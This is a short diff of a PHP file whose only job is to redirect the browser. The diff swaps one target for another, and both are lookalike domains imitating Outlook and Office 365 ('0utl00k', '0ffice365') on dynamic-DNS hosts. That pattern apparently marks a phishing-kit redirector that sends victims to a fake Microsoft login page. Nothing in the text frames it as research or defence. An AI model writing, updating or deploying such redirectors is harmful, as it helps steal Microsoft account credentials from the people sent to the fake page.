@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: https://0utl00k-z0ffice365.mrbasic.com/"); 
+header("Location: https://0ffice365-0utl00k.camdvr.org/"); 
   
 exit; 
 ?> 
